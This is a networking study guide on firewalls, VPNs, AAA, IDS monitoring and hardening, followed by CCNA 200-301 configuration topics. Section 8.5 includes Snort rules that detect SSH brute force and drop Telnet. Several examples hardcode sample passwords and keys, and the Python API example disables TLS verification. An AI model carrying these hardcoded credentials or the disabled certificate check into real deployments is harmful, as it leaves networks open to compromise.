### Next-Generation Firewall (NGFW)

Combines traditional firewall with:
- **Application awareness:** Identify and control apps (not just ports)
- **User identity awareness:** Policy based on username, not just IP
- **SSL/TLS inspection:** Decrypt, inspect, re-encrypt HTTPS traffic
- **IPS:** Inline intrusion prevention
- **URL filtering:** Block websites by category
- **Antivirus/antimalware:** Scan file transfers
- **Sandboxing:** Execute suspicious files in isolated environment

**NGFW vendors:** Palo Alto Networks, Fortinet FortiGate, Cisco Firepower/ASA, Check Point, Juniper SRX

### Cisco ASA Configuration Basics

```cisco
! Interface configuration
ASA(config)# interface GigabitEthernet0/0
ASA(config-if)# nameif outside
ASA(config-if)# security-level 0           ! 0=untrusted (internet)
ASA(config-if)# ip address 203.0.113.1 255.255.255.0

ASA(config)# interface GigabitEthernet0/1
ASA(config-if)# nameif inside
ASA(config-if)# security-level 100        ! 100=most trusted (LAN)
ASA(config-if)# ip address 192.168.1.1 255.255.255.0

ASA(config)# interface GigabitEthernet0/2
ASA(config-if)# nameif dmz
ASA(config-if)# security-level 50
ASA(config-if)# ip address 10.0.1.1 255.255.255.0

! ACL for inbound traffic (outside → inside requires explicit permit)
ASA(config)# access-list OUTSIDE-IN extended permit tcp any host 10.0.1.10 eq 80
ASA(config)# access-list OUTSIDE-IN extended permit tcp any host 10.0.1.10 eq 443
ASA(config)# access-list OUTSIDE-IN extended deny ip any any log
ASA(config)# access-group OUTSIDE-IN in interface outside

! NAT
ASA(config)# object network INSIDE-NET
ASA(config-network-object)# subnet 192.168.1.0 255.255.255.0
ASA(config-network-object)# nat (inside,outside) dynamic interface

! Static NAT (port forward to DMZ server)
ASA(config)# object network WEB-SERVER
ASA(config-network-object)# host 10.0.1.10
ASA(config-network-object)# nat (dmz,outside) static 203.0.113.10 service tcp 80 80

ASA# show conn
ASA# show xlate
ASA# show access-list OUTSIDE-IN
```

---

## 8.3 VPN (Virtual Private Network) Deep Dive

VPNs create encrypted tunnels over untrusted networks (internet) to protect data in transit.

### IPsec VPN

IPsec is a suite of protocols for authenticating and encrypting IP packets.

**IPsec protocols:**
- **AH (Authentication Header, Protocol 51):** Integrity and authentication only — no encryption
- **ESP (Encapsulating Security Payload, Protocol 50):** Integrity, authentication, AND encryption

**IPsec modes:**
- **Transport mode:** Original IP header preserved; only payload encrypted. Used for host-to-host.
- **Tunnel mode:** Entire original packet encapsulated and encrypted; new IP header added. Used for site-to-site VPN.

**IKE (Internet Key Exchange):** Negotiates security parameters (ISAKMP framework)

**IKE Phase 1 (IKE SA / ISAKMP SA):**
- Establish secure channel to negotiate Phase 2
- Exchange: Encryption algorithm, hash, authentication method, DH group, lifetime
- **Main mode:** 6 messages — more secure, slower
- **Aggressive mode:** 3 messages — faster, less secure (identity in clear)
- **IKEv2:** Modern replacement — simpler, faster, more secure

**IKE Phase 2 (IPsec SA):**
- Negotiate IPsec tunnel parameters (Quick Mode)
- Two SAs created (one each direction)
- Uses PFS (Perfect Forward Secrecy) with new DH exchange if configured

**Algorithms commonly used:**
- **Encryption:** AES-128/256 (preferred), 3DES (legacy)
- **Integrity/Hash:** SHA-256/384/512 (preferred), MD5 (avoid), SHA-1 (avoid)
- **DH Group (key exchange):** Group 14+ (2048-bit), Group 19 (256-bit ECC) preferred; avoid Group 1/2/5
- **Authentication:** PSK (Pre-shared key) or RSA certificates

### Cisco IOS IPsec Site-to-Site VPN

```cisco
! Step 1: ISAKMP Policy (Phase 1)
Router(config)# crypto isakmp policy 10
Router(config-isakmp)# encryption aes 256
Router(config-isakmp)# hash sha256
Router(config-isakmp)# authentication pre-share
Router(config-isakmp)# group 14
Router(config-isakmp)# lifetime 86400

! Step 2: Pre-shared key for peer
Router(config)# crypto isakmp key Sup3rS3cr3t address 203.0.113.2

! Step 3: IPsec Transform Set (Phase 2)
Router(config)# crypto ipsec transform-set STRONG-CRYPTO esp-aes 256 esp-sha256-hmac
Router(cfg-crypto-trans)# mode tunnel

! Step 4: ACL defining interesting traffic
Router(config)# ip access-list extended VPN-TRAFFIC
Router(config-ext-nacl)# permit ip 192.168.1.0 0.0.0.255 10.10.10.0 0.0.0.255

! Step 5: Crypto Map
Router(config)# crypto map SITE-TO-SITE 10 ipsec-isakmp
Router(config-crypto-map)# set peer 203.0.113.2
Router(config-crypto-map)# set transform-set STRONG-CRYPTO
Router(config-crypto-map)# match address VPN-TRAFFIC
Router(config-crypto-map)# set pfs group14

! Step 6: Apply to WAN interface
Router(config)# interface GigabitEthernet0/1
Router(config-if)# crypto map SITE-TO-SITE

! Verification
Router# show crypto isakmp sa        ! Phase 1 SA
Router# show crypto ipsec sa         ! Phase 2 SA
Router# show crypto map
Router# show crypto session
Router# debug crypto isakmp
```

### SSL/TLS VPN

- Uses HTTPS (port 443) — passes through most firewalls easily
- **Clientless:** Web browser only — access web apps via portal
- **Client-based (Full tunnel):** VPN client installed — all or specific traffic through VPN
- Popular solutions: Cisco AnyConnect, OpenVPN, Palo Alto GlobalProtect, Pulse Secure

### WireGuard VPN

- Modern, simple, high-performance VPN protocol
- Uses state-of-the-art cryptography: ChaCha20, Poly1305, Curve25519, BLAKE2
- Much simpler than IPsec (fewer lines of code = less attack surface)
- Built into Linux kernel since 5.6

```bash
# WireGuard server setup
wg genkey | tee server_private.key | wg pubkey > server_public.key
wg genkey | tee client_private.key | wg pubkey > client_public.key

# /etc/wireguard/wg0.conf (server)
[Interface]
Address = 10.0.0.1/24
ListenPort = 51820
PrivateKey = <server_private_key>

[Peer]
PublicKey = <client_public_key>
AllowedIPs = 10.0.0.2/32

# Client config
[Interface]
Address = 10.0.0.2/24
PrivateKey = <client_private_key>

[Peer]
PublicKey = <server_public_key>
Endpoint = server.example.com:51820
AllowedIPs = 0.0.0.0/0       # Full tunnel
# AllowedIPs = 10.0.0.0/24   # Split tunnel (only VPN subnet)
```

---

## 8.4 AAA (Authentication, Authorization, Accounting)

### RADIUS

**Remote Authentication Dial-In User Service**
- Client/server protocol for centralized AAA
- Client = network device (NAS — Network Access Server)
- Server = RADIUS server (Cisco ISE, FreeRADIUS, Microsoft NPS)
- **UDP 1812** (authentication), **UDP 1813** (accounting)
- Encrypts only the password field (not entire payload)
- Combines authentication and authorization in one response

**RADIUS flow:**
```
Client → Access-Request → RADIUS Server
Client ← Access-Accept (with attributes) ← RADIUS Server
   OR
Client ← Access-Reject ← RADIUS Server
   OR
Client ← Access-Challenge ← RADIUS Server (MFA prompt)
```

### TACACS+

**Terminal Access Controller Access Control System Plus**
- Cisco proprietary (original TACACS was open; TACACS+ is Cisco)
- **TCP 49**
- **Encrypts entire payload** (more secure than RADIUS)
- **Separates** Authentication, Authorization, and Accounting
- Better for **device administration** (router/switch management)

**RADIUS vs TACACS+ comparison:**

| Feature | RADIUS | TACACS+ |
|---------|--------|---------|
| Protocol | UDP | TCP |
| Port | 1812/1813 | 49 |
| Encryption | Password only | Full payload |
| AAA separation | Combined | Separated |
| Standard | Open standard | Cisco proprietary |
| Best for | Network access (Wi-Fi, VPN) | Device administration |

### Cisco AAA Configuration

```cisco
! Enable AAA
Router(config)# aaa new-model

! RADIUS server group
Router(config)# radius server ISE1
Router(config-radius-server)# address ipv4 192.168.1.100 auth-port 1812 acct-port 1813
Router(config-radius-server)# key R4DiusS3cr3t

! TACACS+ server
Router(config)# tacacs server TACACS-SRV
Router(config-server-tacacs)# address ipv4 192.168.1.101
Router(config-server-tacacs)# key T4C4CSS3cr3t

! Server groups
Router(config)# aaa group server radius RADIUS-GROUP
Router(config-sg-radius)# server name ISE1

Router(config)# aaa group server tacacs+ TACACS-GROUP
Router(config-sg-tacacs+)# server name TACACS-SRV

! Authentication policies
Router(config)# aaa authentication login default group tacacs+ local   ! Use TACACS+, fallback to local
Router(config)# aaa authentication login VTY-AUTH group radius local
Router(config)# aaa authentication enable default group tacacs+ enable ! Enable password via TACACS+

! Authorization
Router(config)# aaa authorization exec default group tacacs+ local     ! Authorize exec shell
Router(config)# aaa authorization commands 15 default group tacacs+ local

! Accounting
Router(config)# aaa accounting exec default start-stop group tacacs+
Router(config)# aaa accounting commands 15 default start-stop group tacacs+

! Apply to VTY lines
Router(config)# line vty 0 15
Router(config-line)# login authentication VTY-AUTH
```

### 802.1X Network Access Control

```cisco
! Enable 802.1X globally
Switch(config)# aaa new-model
Switch(config)# dot1x system-auth-control

! Configure RADIUS server
Switch(config)# radius server ISE
Switch(config-radius-server)# address ipv4 192.168.1.100 auth-port 1812 acct-port 1813
Switch(config-radius-server)# key R4DiusS3cr3t

Switch(config)# aaa group server radius ISE-GROUP
Switch(config-sg-radius)# server name ISE

Switch(config)# aaa authentication dot1x default group ISE-GROUP
Switch(config)# aaa authorization network default group ISE-GROUP
Switch(config)# aaa accounting dot1x default start-stop group ISE-GROUP

! Configure 802.1X on access port
Switch(config)# interface GigabitEthernet0/1
Switch(config-if)# switchport mode access
Switch(config-if)# authentication port-control auto    ! Enable 802.1X
Switch(config-if)# dot1x pae authenticator
Switch(config-if)# mab                                 ! MAC Authentication Bypass (for non-802.1X devices)
Switch(config-if)# authentication order dot1x mab
Switch(config-if)# authentication priority dot1x mab

Switch# show dot1x all
Switch# show authentication sessions
```

---

## 8.5 Network Monitoring and Detection

### NetFlow / IPFIX

**NetFlow** (Cisco proprietary) / **IPFIX** (IETF standard, based on NetFlow v9):
- Collects metadata about IP flows (not the packet content)
- **Flow:** All packets sharing same: src IP, dst IP, src port, dst port, protocol, TOS, input interface

**Flow record fields:**
- Source/Destination IP and port
- Protocol and TOS
- Input/output interface
- Timestamps, packet count, byte count
- TCP flags (for TCP flows)

**NetFlow components:**
- **Exporter:** Router/switch generating flow records
- **Collector:** Server receiving and storing flow data
- **Analyzer:** Tool for viewing and reporting (ntopng, SolarWinds NTA, ELK)

```cisco
! Enable NetFlow on interface
Router(config)# interface GigabitEthernet0/0
Router(config-if)# ip flow ingress
Router(config-if)# ip flow egress

! Export to collector
Router(config)# ip flow-export version 9
Router(config)# ip flow-export destination 192.168.1.200 2055   ! UDP port 2055
Router(config)# ip flow-cache timeout active 60
Router(config)# ip flow-cache timeout inactive 15

Router# show ip flow export
Router# show ip cache flow
```

### Port Mirroring / SPAN (Review)

```cisco
! Mirror traffic to IDS/packet capture station
Switch(config)# monitor session 1 source interface GigabitEthernet0/1 - 10 both
Switch(config)# monitor session 1 destination interface GigabitEthernet0/24
```

### IDS/IPS Signatures and Rules

**Snort (open-source IDS/IPS):**
```
# Snort rule format:
action protocol src_ip src_port direction dst_ip dst_port (options)

alert tcp any any -> any 80 (msg:"HTTP request"; content:"GET"; sid:1000001;)
alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"SSH Brute Force"; threshold:type threshold, track by_src, count 5, seconds 60; sid:1000002;)
alert udp any any -> any 53 (msg:"DNS query to external"; content:"|00 01 00 00 00 00 00 00|"; sid:1000003;)

# Drop (IPS mode)
drop tcp any any -> any 23 (msg:"Telnet blocked"; sid:1000004;)
```

---

## 8.6 Network Hardening

### Device Hardening Checklist

```cisco
! Disable unused services
Router(config)# no cdp run                     ! Disable CDP globally (or per interface)
Router(config)# no ip http server              ! Disable HTTP management
Router(config)# no ip http secure-server       ! Disable HTTPS (if not needed)
Router(config)# no service finger
Router(config)# no ip bootp server
Router(config)# no service pad
Router(config)# no ip source-route

! Secure management
Router(config)# service password-encryption    ! Encrypt passwords in config
Router(config)# security passwords min-length 12
Router(config)# enable secret Str0ng-En4ble    ! Use secret (MD5), not password (plaintext)
Router(config)# username admin privilege 15 secret Str0ng-Admin

! Secure SNMP
Router(config)# no snmp-server community public
Router(config)# no snmp-server community private

! Secure console and VTY
Router(config)# line console 0
Router(config-line)# login local
Router(config-line)# exec-timeout 5 0         ! Timeout after 5 minutes
Router(config-line)# logging synchronous

Router(config)# line vty 0 15
Router(config-line)# login local
Router(config-line)# transport input ssh      ! Only allow SSH, not Telnet
Router(config-line)# exec-timeout 5 0
Router(config-line)# access-class MGMT-ONLY in

! SSH configuration
Router(config)# ip domain-name example.com
Router(config)# crypto key generate rsa modulus 4096
Router(config)# ip ssh version 2
Router(config)# ip ssh time-out 60
Router(config)# ip ssh authentication-retries 3

! Management ACL
Router(config)# ip access-list standard MGMT-ONLY
Router(config-std-nacl)# permit 192.168.100.0 0.0.0.255   ! Management subnet only
Router(config-std-nacl)# deny any log

! Banners
Router(config)# banner motd # Unauthorized access is prohibited. #
Router(config)# banner login # Authorized users only. All access logged. #

! Logging
Router(config)# logging on
Router(config)# logging 192.168.1.200
Router(config)# logging trap informational
Router(config)# service timestamps log datetime msec
Router(config)# archive
Router(config-archive)# log config
Router(config-archive-log-config)# logging enable
Router(config-archive-log-config)# notify syslog
```

---
# SECTION 9: Cisco CCNA 200-301 — Complete Guide

---

## 9.1 CCNA Exam Overview

**Exam Code:** 200-301  
**Questions:** ~100 (multiple-choice, drag-and-drop, simulation)  
**Time Limit:** 120 minutes  
**Passing Score:** ~825 (on a 300–1000 scale)

### Domain Breakdown

| Domain | Weight |
|--------|--------|
| 1. Network Fundamentals | 20% |
| 2. Network Access | 20% |
| 3. IP Connectivity | 25% |
| 4. IP Services | 10% |
| 5. Security Fundamentals | 15% |
| 6. Automation and Programmability | 10% |

---

## 9.2 Cisco IOS Fundamentals

### IOS CLI Modes

```
Router>           User EXEC Mode        — Basic view; limited commands
Router#           Privileged EXEC Mode  — Full read access; configure, copy, debug
Router(config)#   Global Config Mode    — Change global settings
Router(config-if)# Interface Config     — Configure specific interface
Router(config-line)# Line Config       — Configure console/VTY lines
Router(config-router)# Router Config   — Configure routing protocols
Router(config-vlan)# VLAN Config       — Configure VLAN (Switch)
```

**Mode navigation:**
```cisco
Router> enable                          ! User → Privileged
Router# configure terminal              ! Privileged → Global Config
Router(config)# interface gi0/0        ! Global → Interface Config
Router(config-if)# exit                ! One level up
Router(config-if)# end                 ! Jump directly to Privileged
Ctrl+Z                                 ! Same as end
Router# disable                        ! Privileged → User
Router# exit                           ! Log out
```

### Essential CLI Shortcuts

```
?                  Context-sensitive help
Tab                Auto-complete command
Ctrl+A             Move cursor to beginning of line
Ctrl+E             Move cursor to end of line
Ctrl+U             Delete entire line
Ctrl+W             Delete word to the left
Ctrl+C             Interrupt command
Ctrl+Z             Return to privileged mode
Up/Down arrows     Command history
show history       View command history
terminal history size 50    Set history buffer
```

### Abbreviations

IOS accepts minimum unambiguous abbreviations:
```cisco
show → sh
configure terminal → conf t
interface → int
GigabitEthernet → gi or gig
FastEthernet → fa or fast
no shutdown → no shut
copy running-config startup-config → copy run start
```

---

## 9.3 Basic Device Configuration

### Initial Setup

```cisco
! Hostname
Router(config)# hostname R1

! Prevent DNS lookup on typos (often annoying in lab)
R1(config)# no ip domain-lookup

! Set passwords
R1(config)# enable secret Cisco123!           ! Privileged mode password (MD5 hashed)
R1(config)# service password-encryption       ! Encrypt all plaintext passwords

! Console password
R1(config)# line console 0
R1(config-line)# password ConsolePass
R1(config-line)# login
R1(config-line)# logging synchronous          ! Prevents log messages interrupting typing
R1(config-line)# exec-timeout 5 0            ! 5-minute idle timeout

! VTY (Telnet/SSH) password
R1(config)# line vty 0 4
R1(config-line)# password VTYPass
R1(config-line)# login local                  ! Use local database
R1(config-line)# transport input ssh         ! SSH only

! Local user account
R1(config)# username admin privilege 15 secret AdminPass

! Banner
R1(config)# banner motd "Authorized access only!"

! SSH setup
R1(config)# ip domain-name example.com
R1(config)# crypto key generate rsa modulus 2048
R1(config)# ip ssh version 2
```

### Saving Configuration

```cisco
! View configs
R1# show running-config           ! Current active config (in RAM)
R1# show startup-config           ! Saved config (in NVRAM)

! Save config
R1# copy running-config startup-config    ! Save to NVRAM
R1# write memory                          ! Same thing (shorthand)
R1# wr                                    ! Even shorter

! Backup to TFTP
R1# copy running-config tftp://192.168.1.200/R1-backup.cfg

! Restore from TFTP
R1# copy tftp://192.168.1.200/R1-backup.cfg running-config

! Erase startup config
R1# erase startup-config
R1# delete flash:vlan.dat         ! Delete VLAN database on switch

! Reset to factory defaults
R1# erase startup-config
R1# reload
```

---

## 9.4 Interface Configuration

### Router Interfaces

```cisco
! Physical interface
R1(config)# interface GigabitEthernet0/0
R1(config-if)# description Link to Switch SW1
R1(config-if)# ip address 192.168.1.1 255.255.255.0
R1(config-if)# no shutdown                    ! Enable interface (default is shutdown)
R1(config-if)# duplex full
R1(config-if)# speed 1000
R1(config-if)# bandwidth 1000000             ! Sets bandwidth for routing metric (Kbps)
R1(config-if)# clock rate 64000             ! Required on DCE end of serial link

! Loopback interface (always up, never physical)
R1(config)# interface Loopback0
R1(config-if)# ip address 1.1.1.1 255.255.255.255

! Serial interface
R1(config)# interface Serial0/0/0
R1(config-if)# ip address 10.0.0.1 255.255.255.252
R1(config-if)# encapsulation ppp             ! Or hdlc (default on Cisco)
R1(config-if)# no shutdown

! Interface ranges
R1(config)# interface range GigabitEthernet0/0 - 3
R1(config-if-range)# shutdown               ! Shut down multiple at once
```

### Interface Verification

```cisco
R1# show interfaces                          ! All interface status and stats
R1# show interfaces GigabitEthernet0/0       ! Specific interface
R1# show interfaces GigabitEthernet0/0 status  ! Brief status
R1# show ip interface                        ! IP info for all interfaces
R1# show ip interface brief                  ! Quick status table (most used!)
R1# show ip interface GigabitEthernet0/0     ! IP details for interface

! Show ip int brief output:
! Interface       IP-Address      OK?   Method  Status    Protocol
! GigabitEthernet0/0  192.168.1.1  YES  manual  up        up
! GigabitEthernet0/1  unassigned   YES  unset   administratively down  down

! Status column: up / administratively down (shutdown) / down (no cable)
! Protocol column: up / down (Layer 2 issue)

R1# show controllers Serial0/0/0            ! Shows if DCE or DTE
```

---

## 9.5 Switch Configuration

### Basic Switch Commands

```cisco
! VLANs (already covered in switching section)
SW1(config)# vlan 10
SW1(config-vlan)# name Sales

! Access port
SW1(config)# interface FastEthernet0/1
SW1(config-if)# switchport mode access
SW1(config-if)# switchport access vlan 10
SW1(config-if)# no shutdown

! Trunk port
SW1(config)# interface GigabitEthernet0/1
SW1(config-if)# switchport trunk encapsulation dot1q    ! Some switches require this first
SW1(config-if)# switchport mode trunk
SW1(config-if)# switchport trunk native vlan 99
SW1(config-if)# switchport trunk allowed vlan 10,20,30

! Management IP (SVI for VLAN 1 or mgmt VLAN)
SW1(config)# interface vlan 1
SW1(config-if)# ip address 192.168.1.100 255.255.255.0
SW1(config-if)# no shutdown
SW1(config)# ip default-gateway 192.168.1.1

! Switch verification
SW1# show vlan brief
SW1# show interfaces trunk
SW1# show mac address-table
SW1# show mac address-table dynamic
SW1# show mac address-table vlan 10
SW1# show interfaces FastEthernet0/1 switchport
SW1# show spanning-tree
SW1# show spanning-tree summary
```

### Switch Port Security

```cisco
SW1(config-if)# switchport port-security
SW1(config-if)# switchport port-security maximum 3
SW1(config-if)# switchport port-security mac-address sticky
SW1(config-if)# switchport port-security violation restrict

SW1# show port-security interface fa0/1
SW1# show port-security
```

---

## 9.6 Routing Configuration

### Static Routes

```cisco
! Basic static route
R1(config)# ip route 10.0.0.0 255.255.255.0 192.168.1.2      ! Via next-hop
R1(config)# ip route 10.0.0.0 255.255.255.0 GigabitEthernet0/1  ! Via interface
R1(config)# ip route 10.0.0.0 255.255.255.0 GigabitEthernet0/1 192.168.1.2  ! Both

! Default route
R1(config)# ip route 0.0.0.0 0.0.0.0 203.0.113.1

! Floating static (AD 200 — only used if OSPF route disappears)
R1(config)# ip route 10.0.0.0 255.255.255.0 10.255.0.1 200

! Verify routing
R1# show ip route
R1# show ip route 10.0.0.0
R1# show ip route static
R1# show ip route connected
R1# ping 10.0.0.1
R1# ping 10.0.0.1 source GigabitEthernet0/0    ! Ping from specific interface
R1# traceroute 10.0.0.1
```

### OSPF Configuration (CCNA level)

```cisco
! Basic OSPF
R1(config)# router ospf 1
R1(config-router)# router-id 1.1.1.1
R1(config-router)# network 192.168.1.0 0.0.0.255 area 0
R1(config-router)# network 10.0.0.0 0.0.0.3 area 0
R1(config-router)# passive-interface GigabitEthernet0/0   ! Don't send Hellos on LAN

! OSPF on specific interface (alternative)
R1(config)# interface GigabitEthernet0/1
R1(config-if)# ip ospf 1 area 0

! Adjust cost
R1(config)# interface GigabitEthernet0/1
R1(config-if)# ip ospf cost 100

! Advertise default route into OSPF
R1(config)# router ospf 1
R1(config-router)# default-information originate

! Verification
R1# show ip ospf neighbor
R1# show ip ospf
R1# show ip ospf interface brief
R1# show ip ospf interface GigabitEthernet0/1
R1# show ip ospf database
R1# show ip route ospf
```

### EIGRP Configuration (CCNA level)

```cisco
R1(config)# router eigrp 100
R1(config-router)# network 192.168.1.0 0.0.0.255
R1(config-router)# network 10.0.0.0 0.0.0.3
R1(config-router)# no auto-summary
R1(config-router)# passive-interface GigabitEthernet0/0
R1(config-router)# eigrp router-id 1.1.1.1

R1# show ip eigrp neighbors
R1# show ip eigrp topology
R1# show ip route eigrp
```

---

## 9.7 DHCP on Cisco Router

```cisco
! DHCP pool
R1(config)# ip dhcp pool LAN-CLIENTS
R1(dhcp-config)# network 192.168.1.0 255.255.255.0
R1(dhcp-config)# default-router 192.168.1.1
R1(dhcp-config)# dns-server 8.8.8.8 8.8.4.4
R1(dhcp-config)# domain-name example.com
R1(dhcp-config)# lease 7                          ! 7-day lease
R1(dhcp-config)# lease infinite

! Exclude IPs from pool (router IPs, servers, etc.)
R1(config)# ip dhcp excluded-address 192.168.1.1 192.168.1.20

! DHCP Relay (forward DHCP to server on another subnet)
R1(config)# interface GigabitEthernet0/0          ! Client-facing interface
R1(config-if)# ip helper-address 10.0.0.100       ! DHCP server IP

! Verification
R1# show ip dhcp pool
R1# show ip dhcp binding
R1# show ip dhcp conflict
R1# show ip dhcp server statistics
```

---

## 9.8 NAT Configuration (CCNA Level)

```cisco
! Identify inside/outside
R1(config)# interface GigabitEthernet0/0          ! LAN
R1(config-if)# ip nat inside

R1(config)# interface GigabitEthernet0/1          ! WAN/Internet
R1(config-if)# ip nat outside

! PAT (most common)
R1(config)# access-list 1 permit 192.168.1.0 0.0.0.255
R1(config)# ip nat inside source list 1 interface GigabitEthernet0/1 overload

! Static NAT
R1(config)# ip nat inside source static 192.168.1.10 203.0.113.10

! Port forwarding (static PAT)
R1(config)# ip nat inside source static tcp 192.168.1.10 80 203.0.113.1 80

! Verification
R1# show ip nat translations
R1# show ip nat translations verbose
R1# show ip nat statistics
R1# debug ip nat
```

---

## 9.9 IPv6 Configuration

```cisco
! Enable IPv6 routing
R1(config)# ipv6 unicast-routing

! Manual address
R1(config)# interface GigabitEthernet0/0
R1(config-if)# ipv6 address 2001:db8:1::1/64
R1(config-if)# ipv6 address FE80::1 link-local     ! Manual link-local
R1(config-if)# no shutdown

! SLAAC (device automatically configures address from RA)
R1(config-if)# ipv6 address autoconfig              ! On client interface

! OSPFv3 for IPv6
R1(config)# ipv6 router ospf 1
R1(config-rtr)# router-id 1.1.1.1

R1(config)# interface GigabitEthernet0/0
R1(config-if)# ipv6 ospf 1 area 0

! IPv6 static routes
R1(config)# ipv6 route 2001:db8:2::/64 2001:db8:ff::2
R1(config)# ipv6 route ::/0 2001:db8:ff::1           ! Default route

! Verification
R1# show ipv6 interface brief
R1# show ipv6 interface GigabitEthernet0/0
R1# show ipv6 route
R1# show ipv6 neighbors
R1# ping ipv6 2001:db8:2::1
```

---

## 9.10 Cisco Troubleshooting Methodology

### 7-Step Process (CompTIA) / Cisco Approach

1. **Define the problem** — Gather symptoms, affected users, scope
2. **Gather information** — Show commands, logs, user reports
3. **Analyze information** — Compare to expected behavior
4. **Eliminate possible causes** — Narrow down
5. **Propose hypothesis** — Most likely cause
6. **Test hypothesis** — Verify or disprove
7. **Solve and document** — Fix, verify, document

### Key Troubleshooting Commands

```cisco
! Layer 1
R1# show interfaces GigabitEthernet0/0   ! Look for: up/up, errors, input/output drops
R1# show interfaces counters errors        ! Input/output errors
! Status: up/up = good, admin down = shut, down/down = cable/hardware issue

! Layer 2
SW1# show mac address-table              ! Check MAC learning
SW1# show interfaces trunk               ! Verify trunk links
SW1# show spanning-tree                  ! Check for blocked ports, root bridge
SW1# show vlan brief                     ! Verify VLAN assignments

! Layer 3
R1# show ip interface brief              ! All interface IPs and status
R1# show ip route                        ! Routing table
R1# show ip arp                         ! ARP cache
R1# ping 10.0.0.1                       ! Basic connectivity
R1# traceroute 10.0.0.1                 ! Path to destination
R1# show ip protocols                   ! Running routing protocols

! OSPF troubleshooting
R1# show ip ospf neighbor               ! Should show FULL adjacency
R1# show ip ospf database               ! LSDB
R1# debug ip ospf hello                 ! Watch Hello packets
R1# debug ip ospf events                ! OSPF events

! EIGRP troubleshooting
R1# show ip eigrp neighbors             ! Neighbor table
R1# show ip eigrp topology             ! Topology table (FSs visible)
R1# debug eigrp packets                ! Packet-level debug

! Show commands for CCNA exam
R1# show version                        ! IOS version, uptime, hardware
R1# show running-config                 ! Current config
R1# show ip bgp summary                ! BGP neighbor status
R1# show cdp neighbors                 ! Discover directly connected Cisco devices
R1# show cdp neighbors detail          ! IP addresses of neighbors
R1# show lldp neighbors                ! Open standard neighbor discovery

! Common issues and checks:
! No route → check 'show ip route'
! Wrong subnet → check ip address and mask on both ends
! OSPF not forming → check area, timers, MTU, authentication
! Can't ping across router → check no shutdown, ip address, routing
```

### Ping Extended Options

```cisco
R1# ping 10.0.0.1 repeat 100           ! Send 100 pings
R1# ping 10.0.0.1 size 1500            ! Large packet (test MTU)
R1# ping 10.0.0.1 source Loopback0    ! From loopback
R1# ping 10.0.0.1 timeout 2           ! 2-second timeout
R1# ping 10.0.0.1 df-bit              ! Don't fragment (path MTU test)

! Extended ping (interactive)
R1# ping
Protocol [ip]:
Target IP address: 10.0.0.1
Repeat count [5]: 100
Datagram size [100]: 1500
Timeout in seconds [2]:
Extended commands [n]: y
Source address or interface: 192.168.1.1
...
```

---

## 9.11 Network Automation and Programmability (CCNA)

### Key Concepts

**SDN (Software-Defined Networking):**
- Separates control plane from data plane
- Centralized intelligence in controller
- Northbound APIs (apps ↔ controller): REST, RESTCONF
- Southbound APIs (controller ↔ devices): OpenFlow, NETCONF, YANG

**Controller-based networking:**
- **Cisco DNA Center:** SDN controller for campus networks
- **Cisco ACI (Application Centric Infrastructure):** SDN for datacenter
- **OpenDaylight:** Open-source SDN controller

**DNA Center benefits:**
- Centralized network management
- Network intent (describe what you want, not how)
- Automation of routine tasks
- Assurance (monitoring, troubleshooting)

### APIs

**REST (Representational State Transfer) API:**
- Uses HTTP methods: GET, POST, PUT, PATCH, DELETE
- Data format: JSON or XML
- Stateless — each request is independent

```python
import requests
import json

# Cisco DNA Center API example
url = "https://sandboxdnac.cisco.com/dna/intent/api/v1/network-device"
headers = {
    "Content-Type": "application/json",
    "X-Auth-Token": "your-token-here"
}

response = requests.get(url, headers=headers, verify=False)
devices = response.json()
for device in devices["response"]:
    print(device["hostname"], device["managementIpAddress"])
```

### Data Formats

**JSON (JavaScript Object Notation):**
```json
{
  "hostname": "R1",
  "ip": "192.168.1.1",
  "interfaces": [
    {"name": "Gi0/0", "status": "up"},
    {"name": "Gi0/1", "status": "down"}
  ]
}
```

**XML (eXtensible Markup Language):**
```xml
<device>
  <hostname>R1</hostname>
  <ip>192.168.1.1</ip>
  <interfaces>
    <interface>
      <name>Gi0/0</name>
      <status>up</status>
    </interface>
  </interfaces>
</device>
```

**YAML (YAML Ain't Markup Language):**
```yaml
hostname: R1
ip: 192.168.1.1
interfaces:
  - name: Gi0/0
    status: up
  - name: Gi0/1
    status: down
```

### NETCONF and YANG

**NETCONF:** Network management protocol using XML over SSH/TLS
- Uses YANG data models to describe network configuration
- Operations: get, get-config, edit-config, copy-config, delete-config, lock, unlock

**YANG:** Data modeling language for network configuration
```yang
module interfaces {
  container interfaces {
    list interface {
      key "name";
      leaf name { type string; }
      leaf status { type enumeration { enum up; enum down; } }
      leaf ip-address { type string; }
    }
  }
}
```

### Ansible for Network Automation

```yaml
# Cisco IOS configuration playbook
---
- name: Configure Cisco Router
  hosts: routers
  gather_facts: no

  tasks:
    - name: Set hostname
      ios_hostname:
        config: R1
      
    - name: Configure interfaces
      ios_interfaces:
        config:
          - name: GigabitEthernet0/0
            description: LAN
            enabled: true
        state: merged

    - name: Configure OSPF
      ios_ospfv2:
        config:
          processes:
            - process_id: 1
              router_id: 1.1.1.1
              areas:
                - area_id: "0"
                  ranges:
                    - address: 192.168.1.0/24

# Inventory file
[routers]
R1 ansible_host=192.168.1.1 ansible_user=admin ansible_password=Cisco123! ansible_connection=network_cli ansible_network_os=ios
```

### Python for Network Automation

```python
# Netmiko — simplifies SSH connections to network devices
from netmiko import ConnectHandler

device = {
    "device_type": "cisco_ios",
    "host": "192.168.1.1",
    "username": "admin",
    "password": "Cisco123!",
    "secret": "Enable123!"
}

with ConnectHandler(**device) as conn:
    conn.enable()
    
    # Show command
    output = conn.send_command("show ip interface brief")
    print(output)
    
    # Configuration
    config_commands = [
        "interface GigabitEthernet0/0",
        "description Configured by Netmiko",
        "ip address 192.168.2.1 255.255.255.0",
        "no shutdown"
    ]
    conn.send_config_set(config_commands)
    conn.save_config()

# NAPALM — vendor-neutral network automation
from napalm import get_network_driver

driver = get_network_driver("ios")
device = driver(
    hostname="192.168.1.1",
    username="admin",
    password="Cisco123!",
    optional_args={"secret": "Enable123!"}
)

device.open()
facts = device.get_facts()
interfaces = device.get_interfaces_ip()
bgp_neighbors = device.get_bgp_neighbors()
device.close()
```

---

## 9.12 CCNA Quick Reference

**OSI Layers:** Physical → Data Link → Network → Transport → Session → Presentation → Application  
**PDUs:** Bits → Frames → Packets → Segments → Data  
**TCP 3-way:** SYN → SYN-ACK → ACK  
**Subnetting hosts:** 2^n - 2 (n = host bits)  
**Show ip int brief:** Quick interface status check  
**OSPF neighbor states:** Down → Init → 2-Way → ExStart → Exchange → Loading → Full  
